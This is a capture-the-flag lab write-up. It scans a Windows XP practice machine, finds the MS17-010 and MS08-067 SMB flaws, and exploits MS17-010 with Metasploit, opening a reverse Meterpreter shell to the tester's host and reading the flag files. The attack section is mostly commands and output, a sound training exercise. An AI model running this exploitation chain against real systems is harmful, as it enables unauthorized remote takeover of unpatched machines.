## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ nmap 10.129.227.181 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-21 11:36 +0545
Nmap scan report for 10.129.227.181
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3301/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 30.88 seconds
```

## Enumerating Port 445:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ nmap 10.129.227.181 -sV -sC -p 445 --script=vuln
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-21 11:38 +0545
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.227.181
Host is up (0.32s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.67 seconds
```

We got some juicy information from the nmap scan, we can see that the machine is vulnerable to `ms17-010` and `ms08-067`, let's try to exploit `ms17-010` first.

```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.17
LHOST => 10.10.14.17
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.129.227.181:445 - Target OS: Windows 5.1
[*] 10.129.227.181:445 - Filling barrel with fish... done
[*] 10.129.227.181:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.227.181:445 -        [*] Preparing dynamite...
[*] 10.129.227.181:445 -                [*] Trying stick 1 (x86)...Boom!
[*] 10.129.227.181:445 -        [+] Successfully Leaked Transaction!
[*] 10.129.227.181:445 -        [+] Successfully caught Fish-in-a-barrel
[*] 10.129.227.181:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.227.181:445 - Reading from CONNECTION struct at: 0x86454990
[*] 10.129.227.181:445 - Built a write-what-where primitive...
[+] 10.129.227.181:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.227.181:445 - Selecting native target
[*] 10.129.227.181:445 - Uploading payload... iMzMMuMp.exe
[*] 10.129.227.181:445 - Created \iMzMMuMp.exe...
[+] 10.129.227.181:445 - Service started successfully...
[*] Sending stage (175686 bytes) to 10.129.227.181
[*] 10.129.227.181:445 - Deleting \iMzMMuMp.exe...
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.129.227.181:1055) at 2023-12-21 15:16:44 +0545

meterpreter > shell
Process 864 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713

C:\Documents and Settings\john\Desktop>type user.txt
e69af0e4f443de7e36876fda4ec7644f
```

# Takeaways:
- Don't miss to use script vuln in nmap scan for the quick win.